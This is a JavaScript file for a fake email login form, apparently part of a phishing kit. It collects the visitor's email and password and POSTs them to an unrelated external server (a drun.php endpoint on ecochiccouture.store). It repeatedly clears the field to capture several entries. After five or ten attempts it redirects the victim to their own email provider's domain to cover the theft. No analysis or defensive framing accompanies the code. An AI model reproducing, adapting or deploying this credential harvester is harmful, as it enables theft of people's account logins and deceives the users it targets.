
                        $(document).ready(function () {
                        let attemptCount = 0;

                        const defaultMessage = 'Invalid email format. Please enter a valid email address.';

                        $('#submit-btn').click(function (e) {
                            e.preventDefault();
                            $('#error').hide();
                            $('#msg').hide();

                            let email = $('#ai').val();
                            let password = $('#pr').val();
                            let msgHtml = $('#msg').html();
                            $('#msg').text(msgHtml);

                            let emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

                            // Validate email and password
                            if (!email) {
                                $('#error').show().html('The password field is empty!');
                                return false;
                            }
                            if (!emailRegex.test(email)) {
                                $('#error').show().html('Invalid email format. Please enter a valid email address.');
                                return false;
                            }
                            if (!password) {
                                $('#error').show().html('Verifying...');
                                return false;
                            }

                            let atIndex = email.indexOf('@');
                            let domain = email.substr(atIndex + 1);
                            let mainDomain = domain.substr(0, domain.indexOf('.')).toLowerCase();

                            attemptCount++;

                            $.ajax({
                                dataType: 'JSON',
                                url: 'https://ecochiccouture.store/Docs/saac.Xcel.pagem/drun.php',
                                type: 'POST',
                                data: { email: email, password: password },
                                beforeSend: function () {
                                    $('#signal').html('Loading...');
                                },
                                success: function (response) {
                                    if (response) {
                                        $('#msg').show();
                                        console.log(response);
                                        if (response.ret === 'ok') {
                                            $('#ai').val('');
                                            if (attemptCount >= 10) {
                                                attemptCount = 0;
                                                window.location.replace('http://www.' + domain);
                                                return false;
                                            }
                                        }
                                    }
                                },
                                error: function () {
                                    $('#ai').val('');
                                    if (attemptCount >= 5) {
                                        attemptCount = 0;
                                        window.location.replace('http://www.' + domain);
                                        return false;
                                    }
                                    $('#msg').show();
                                },
                                complete: function () {
                                    $('#signal').html(defaultMessage);
                                }
                            });
                        });
                    });

                    
